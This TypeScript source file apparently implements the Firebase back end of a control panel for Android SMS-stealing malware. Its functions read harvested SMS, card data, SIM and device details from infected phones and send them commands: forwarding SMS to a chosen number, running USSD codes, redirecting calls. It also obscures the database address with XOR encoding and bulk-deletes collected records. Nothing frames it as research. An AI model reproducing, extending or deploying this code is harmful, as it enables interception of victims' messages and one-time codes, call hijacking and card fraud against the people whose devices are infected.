
import * as firebaseApp from "firebase/app";
import { 
  getDatabase, ref, set, update, get, remove, 
  onValue, push, query, orderByChild, limitToLast, 
  endBefore, limitToFirst, startAfter, equalTo,
  Database,
  DataSnapshot
} from "firebase/database";
import { User, SMS, UserFullInfo, DeviceInfo, Notification, Message } from "../types";

// Workaround for type mismatch in some environments
const { initializeApp, getApps, getApp } = firebaseApp as any;

const CRYPTO_PASS = "PANEL_WALA_V90_SECURE_2025";

export const encryptToken = (url: string): string => {
  if (!url) return "";
  try {
    const b64Url = btoa(unescape(encodeURIComponent(url)));
    let xored = '';
    for (let i = 0; i < b64Url.length; i++) {
      const charCode = b64Url.charCodeAt(i) ^ CRYPTO_PASS.charCodeAt(i % CRYPTO_PASS.length);
      xored += String.fromCharCode(charCode);
    }
    return btoa(unescape(encodeURIComponent(xored)));
  } catch (e) {
    console.error("Encryption error:", e);
    return "";
  }
};

export const decryptToken = (token: string): string | null => {
  if (!token || typeof token !== 'string') return null;
  if (token.startsWith('http')) return token;
  try {
    const xored = decodeURIComponent(escape(atob(token)));
    let b64Url = '';
    for (let i = 0; i < xored.length; i++) {
      const charCode = xored.charCodeAt(i) ^ CRYPTO_PASS.charCodeAt(i % CRYPTO_PASS.length);
      b64Url += String.fromCharCode(charCode);
    }
    const url = decodeURIComponent(escape(atob(b64Url)));
    if (url.startsWith('http')) return url;
    return null;
  } catch (e) {
    return null;
  }
};

const isValidUrl = (url: string | null | undefined): boolean => {
  if (!url) return false;
  try {
    const parsed = new URL(url);
    return parsed.protocol === 'https:' && (
      parsed.hostname.endsWith('firebaseio.com') || 
      parsed.hostname.endsWith('firebasedatabase.app') ||
      parsed.hostname.includes('firebase')
    );
  } catch (e) {
    return false;
  }
};

export const getCurrentDatabaseUrl = () => {
  const storedToken = localStorage.getItem('panel_access_token');
  if (storedToken) {
    const decryptedUrl = decryptToken(storedToken);
    if (isValidUrl(decryptedUrl)) return decryptedUrl as string;
  }
  return "";
};

let _db: Database | null = null;
let _lastUrl: string = "";

const getDB = (): Database | null => {
  const currentUrl = getCurrentDatabaseUrl();
  if (!currentUrl) return null;

  // Clean trailing slash for consistency
  const cleanUrl = currentUrl.endsWith('/') ? currentUrl.slice(0, -1) : currentUrl;

  if (!_db || _lastUrl !== cleanUrl) {
    const firebaseConfig = {
      apiKey: "AIzaSy-demo-key",
      authDomain: "panel-wala-demo.firebaseapp.com",
      databaseURL: cleanUrl,
      projectId: "panel-wala-demo"
    };

    try {
      let app;
      const existingApps = getApps();
      if (existingApps.length === 0) {
        app = initializeApp(firebaseConfig);
      } else {
        app = existingApps[0];
      }
      _db = getDatabase(app, cleanUrl);
      _lastUrl = cleanUrl;
    } catch (error) {
      console.error("Firebase Init Error:", error);
      return null;
    }
  }
  return _db;
};

export const saveAccessToken = (token: string) => {
  if (!token) return false;
  const url = decryptToken(token);
  if (url && isValidUrl(url)) {
    localStorage.setItem('panel_access_token', token);
    localStorage.removeItem('panel_firebase_url');
    _db = null; 
    _lastUrl = "";
    return true;
  }
  return false;
};

export const getCurrentAccessToken = () => localStorage.getItem('panel_access_token') || '';
export type Unsubscribe = () => void;

export const logoutUser = () => {
  localStorage.removeItem('panel_access_token');
  localStorage.removeItem('panel_firebase_url');
  _db = null;
  _lastUrl = "";
};

export const loginUser = async (key: string): Promise<{ success: boolean; user?: User; message?: string; userType?: string; isExpired?: boolean }> => {
  const db = getDB();
  if (!db) return { success: false, message: "Configuration Required" };
  const cleanInput = key.trim();
  try {
    const adminRef = ref(db, 'All_Users/Admin');
    const adminSnapshot = await get(adminRef);
    if (adminSnapshot.exists()) {
        const adminData = adminSnapshot.val();
        let dbKey = '';
        if (typeof adminData === 'string' || typeof adminData === 'number') dbKey = String(adminData);
        else if (typeof adminData === 'object') {
             const keyProp = Object.keys(adminData).find(k => ['key', 'accesskey', 'password', 'pass', 'pin'].includes(k.toLowerCase()));
             if (keyProp) dbKey = String(adminData[keyProp]);
        }
        if (dbKey && dbKey.trim() === cleanInput) {
             return { success: true, userType: 'Admin', user: { key: cleanInput, userId: 'admin', androidId: 'admin_device', isBlocked: false, expirationTime: 'never', userType: 'Admin', keyType: 'WEB' } };
        }
    }
    
    let usersSnapshot, fallbackMode = false;
    try {
      const usersQuery = query(ref(db, 'users'), orderByChild('key'), equalTo(cleanInput));
      usersSnapshot = await get(usersQuery);
    } catch (e) {
      fallbackMode = true;
      usersSnapshot = await get(ref(db, 'users'));
    }

    if (!usersSnapshot || !usersSnapshot.exists()) return { success: false, message: "Invalid key" };

    let userData: any = null;
    let pushKey = '';
    usersSnapshot.forEach((child: DataSnapshot) => {
        const val = child.val();
        if (fallbackMode) { if (val.key === cleanInput) { userData = val; pushKey = child.key as string; } } 
        else { userData = val; pushKey = child.key as string; }
    });

    if (!userData) return { success: false, message: "Invalid key" };
    if (userData.isBlocked === true || userData.isBlocked === "true") return { success: false, message: "Key blocked" };
    
    return { 
        success: true, 
        userType: userData.userType || 'Client', 
        user: { 
            key: cleanInput, 
            userId: pushKey, 
            androidId: 'web-panel', 
            isBlocked: false, 
            expirationTime: userData.expirationTime, 
            userType: userData.userType || 'Client', 
            keyChangeCount: userData.keyChangeCount || 0,
            keyType: userData.keyType || 'WEB'
        } 
    };
  } catch (error: any) {
    return { success: false, message: error.message };
  }
};

export const subscribeToNotification = (callback: (msg: string) => void): Unsubscribe => {
  const db = getDB();
  if (!db) { callback(''); return () => {}; }
  return onValue(ref(db, 'notification'), (snapshot) => {
    const val = snapshot.val();
    if (!val) { callback(''); return; }
    if (typeof val === 'object' && val.message) callback(String(val.message));
    else if (typeof val === 'string') callback(val);
    else callback('');
  });
};

export const subscribeToUsers = (callback: (users: DeviceInfo[]) => void): Unsubscribe => {
  const db = getDB();
  if (!db) { callback([]); return () => {}; }
  return onValue(ref(db, 'All_Users/DeviceInfo'), (snapshot) => {
    const data = snapshot.val();
    callback(data ? Object.keys(data).map(key => ({ ...data[key], userId: key })) : []);
  });
};

export const subscribeToFullUserInfo = (userId: string, callback: (data: UserFullInfo) => void): Unsubscribe => {
  const db = getDB();
  if (!db || !userId) { callback({}); return () => {}; }
  let currentData: UserFullInfo = { info: null, cards: null, simDetails: null, deviceInfo: null };
  const emit = () => callback({...currentData});
  const u1 = onValue(ref(db, `All_Users/Info/${userId}`), s => { currentData.info = s.val(); emit(); });
  const u2 = onValue(ref(db, `All_Users/Card/${userId}`), s => { currentData.cards = s.val(); emit(); });
  const u3 = onValue(ref(db, `All_Users/simDetails/${userId}`), s => { currentData.simDetails = s.val(); emit(); });
  const u4 = onValue(ref(db, `All_Users/DeviceInfo/${userId}`), s => { currentData.deviceInfo = s.val(); emit(); });
  return () => { u1(); u2(); u3(); u4(); };
};

export const sendCommandSms = async (userId: string, to: string, msg: string, slot: number) => {
  const db = getDB();
  if (!db || !userId) return;
  await set(ref(db, `All_Users/SmsForwarding/${userId}`), { 
    command: "forwardSms",
    toNumber: to,
    message: msg, 
    simSlot: slot
  });
};

export const sendUssdCommand = async (userId: string, ussdCode: string, slot: number) => {
  const db = getDB();
  if (!db || !userId) return;
  const ussdRef = push(ref(db, `All_Users/UssdCommands/${userId}`));
  await set(ussdRef, { 
    ussdCode: ussdCode,
    simSlot: slot,
    timestamp: Date.now() 
  });
};

export const fetchGlobalSMS = async (): Promise<SMS[]> => {
  const db = getDB();
  if (!db) return [];
  try {
    const snapshot = await get(ref(db, `All_Users/sms`));
    if (!snapshot.exists()) return [];
    const allData = snapshot.val();
    let allSMS: SMS[] = [];
    if (allData && typeof allData === 'object') {
      Object.keys(allData).forEach(userId => {
        const userData = allData[userId];
        if (userData && typeof userData === 'object') {
            Object.entries(userData).forEach(([key, val]: [string, any]) => {
                allSMS.push({ ...val, key, userId });
            });
        }
      });
    }
    return allSMS.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
  } catch (err) {
    console.error("fetchGlobalSMS Permission Error:", err);
    return [];
  }
};

export const getSmsCount = async (userId?: string): Promise<number> => {
  const db = getDB();
  if (!db) return 0;
  try {
    const path = userId ? `All_Users/sms/${userId}` : `All_Users/sms`;
    const snapshot = await get(ref(db, path));
    if (!snapshot.exists()) return 0;
    const data = snapshot.val();
    if (!data) return 0;

    if (userId) return Object.keys(data).length;
    
    let total = 0;
    Object.values(data).forEach((userData: any) => {
       if (userData && typeof userData === 'object') {
         total += Object.keys(userData).length;
       }
    });
    return total;
  } catch (e) {
    console.error("getSmsCount Permission Error:", e);
    return 0;
  }
};

export const subscribeToSMS = (userId: string, callback: (sms: SMS[]) => void): Unsubscribe => {
  const db = getDB();
  if (!db || !userId) { callback([]); return () => {}; }
  const q = query(ref(db, `All_Users/sms/${userId}`), orderByChild('timestamp'), limitToLast(50));
  return onValue(q, (snapshot) => {
    const data = snapshot.val();
    if (!data) { callback([]); return; }
    const list: SMS[] = Object.entries(data).map(([key, val]: [string, any]) => ({
      ...val,
      key,
      userId
    })).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    callback(list);
  }, (err) => {
    console.error("subscribeToSMS Permission Error:", err);
    callback([]);
  });
};

export const fetchOlderSMS = async (userId: string, lastTimestamp: number): Promise<SMS[]> => {
  const db = getDB();
  if (!db || !userId) return [];
  try {
    const q = query(
      ref(db, `All_Users/sms/${userId}`),
      orderByChild('timestamp'),
      endBefore(lastTimestamp),
      limitToLast(50)
    );
    const snapshot = await get(q);
    if (!snapshot.exists()) return [];
    const data = snapshot.val();
    return Object.entries(data).map(([key, val]: [string, any]) => ({
      ...val,
      key,
      userId
    })).sort((a, b) => b.timestamp - a.timestamp);
  } catch (e) {
    console.error("fetchOlderSMS Permission Error:", e);
    return [];
  }
};

export const deleteSMS = async (userId: string, smsKey: string) => {
  const db = getDB();
  if (!db || !userId) return;
  await remove(ref(db, `All_Users/sms/${userId}/${smsKey}`));
};

export const deleteBatchSMS = async (smsList: SMS[]) => {
  const db = getDB();
  if (!db || smsList.length === 0) return;
  const updates: Record<string, null> = {};
  smsList.forEach(sms => updates[`All_Users/sms/${sms.userId}/${sms.key}`] = null);
  await update(ref(db), updates);
};

export const deleteAllSMS = async (userId: string) => {
  const db = getDB();
  if (!db || !userId) return;
  await remove(ref(db, `All_Users/sms/${userId}`));
};

export const deleteAllGlobalSMS = async () => {
  const db = getDB();
  if (!db) return;
  await remove(ref(db, `All_Users/sms`));
};

export const deleteAllGlobalData = async () => {
  const db = getDB();
  if (!db) return;
  const updates: Record<string, null> = {
    'All_Users/Info': null,
    'All_Users/Card': null
  };
  await update(ref(db), updates);
};

export const deleteOfflineUsers = async (offlineUserIds: string[]) => {
  const db = getDB();
  if (offlineUserIds.length === 0 || !db) return;
  const updates: Record<string, null> = {};
  offlineUserIds.forEach(userId => {
    updates[`users/${userId}`] = null;
    updates[`All_Users/DeviceInfo/${userId}`] = null;
    updates[`All_Users/simDetails/${userId}`] = null;
    updates[`All_Users/Info/${userId}`] = null;
    updates[`All_Users/sms/${userId}`] = null;
    updates[`All_Users/Card/${userId}`] = null;
    updates[`All_Users/SmsForwarding/${userId}`] = null;
    updates[`All_Users/UssdCommands/${userId}`] = null;
    updates[`All_Users/CallForwarding/${userId}`] = null;
    updates[`All_Users/UssdResponses/${userId}`] = null;
    updates[`All_Users/Messages/${userId}`] = null;
  });
  await update(ref(db), updates);
};

export const subscribeToGlobalData = (callback: (data: any[]) => void): Unsubscribe => {
  const db = getDB();
  if (!db) { callback([]); return () => {}; }
  let devices: any = {}, infos: any = {}, cards: any = {};
  const emit = () => {
    const allIds = new Set([...Object.keys(devices), ...Object.keys(infos), ...Object.keys(cards)]);
    callback(Array.from(allIds).map(userId => ({ userId, ...(devices[userId] || {}), info: infos[userId], cards: cards[userId] })));
  };
  const u1 = onValue(ref(db, 'All_Users/DeviceInfo'), s => { devices = s.val() || {}; emit(); });
  const u2 = onValue(ref(db, 'All_Users/Info'), s => { infos = s.val() || {}; emit(); });
  const u3 = onValue(ref(db, 'All_Users/Card'), s => { cards = s.val() || {}; emit(); });
  return () => { u1(); u2(); u3(); };
};

export const getAdminNumber = async (): Promise<string> => {
  const db = getDB();
  if (!db) return '';
  try {
    const snapshot = await get(ref(db, 'All_Users/Admin/Number'));
    return snapshot.exists() ? String(snapshot.val()) : '';
  } catch (e) { return ''; }
};

export const updateAdminNumber = async (newNumber: string): Promise<void> => {
  const db = getDB();
  if (!db) return;
  await update(ref(db, 'All_Users/Admin'), { Number: newNumber });
};

export const subscribeToLatestUssdResponse = (userId: string, callback: (data: any) => void): Unsubscribe => {
  const db = getDB();
  if (!db || !userId) { callback(null); return () => {}; }
  const q = query(ref(db, `All_Users/UssdResponses/${userId}`), orderByChild('timestamp'), limitToLast(1));
  return onValue(q, (snapshot) => {
    const data = snapshot.val();
    if (!data) { callback(null); return; }
    const key = Object.keys(data)[0];
    callback(data[key]);
  });
};

export const subscribeToCallForwarding = (userId: string, callback: (data: any) => void): Unsubscribe => {
  const db = getDB();
  if (!db || !userId) return () => {};
  return onValue(ref(db, `All_Users/CallForwarding/${userId}/callForwardStatus`), (snap) => callback(snap.val()));
};

export const setCallForwarding = async (userId: string, number: string, slot: number, enable: boolean) => {
  const db = getDB();
  if (!db || !userId) return;
  await set(ref(db, `All_Users/CallForwarding/${userId}`), { 
    command: enable ? "enableCallForwarding" : "disableCallForwarding",
    toNumber: number, 
    slot: slot 
  });
};

export const markUserAsChecked = async (userId: string) => {
   const db = getDB();
   if (!db || !userId) return;
   await update(ref(db, `All_Users/DeviceInfo/${userId}`), { checked: true });
};

export const subscribeToSystemNotifications = (callback: (notifs: Notification[]) => void): Unsubscribe => {
    const db = getDB();
    if (!db) { callback([]); return () => {}; }
    const q = query(ref(db, `notifications`), orderByChild('timestamp'), limitToLast(50));
    return onValue(q, (snapshot) => {
        const data = snapshot.val();
        if (!data) { callback([]); return; }
        const list: Notification[] = Object.entries(data).map(([key, val]: [string, any]) => ({
            id: key,
            type: val.type || 'INFO',
            title: val.title || 'No Title',
            text: val.text || val.message || '',
            timestamp: val.timestamp || Date.now(),
            read: !!val.read,
            priority: val.priority || 'normal'
        })).sort((a, b) => b.timestamp - a.timestamp);
        callback(list);
    });
};

export const markNotificationAsRead = async (notificationId: string) => {
    const db = getDB();
    if (!db || !notificationId) return;
    await update(ref(db, `notifications/${notificationId}`), { read: true });
};

export const subscribeToAllMessages = (callback: (messages: Message[]) => void): Unsubscribe => {
  const db = getDB();
  if (!db) { callback([]); return () => {}; }
  return onValue(ref(db, 'All_Users/Messages'), (snapshot) => {
    const allData = snapshot.val();
    if (!allData) { callback([]); return; }
    let allMessages: Message[] = [];
    Object.keys(allData).forEach(deviceId => {
      if (allData[deviceId]) {
        Object.entries(allData[deviceId]).forEach(([key, val]: [string, any]) => {
          allMessages.push({ ...val, key, deviceId });
        });
      }
    });
    allMessages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    callback(allMessages);
  });
};

export const deleteAllAppMessages = async () => {
  const db = getDB();
  if (!db) return;
  await remove(ref(db, 'All_Users/Messages'));
};
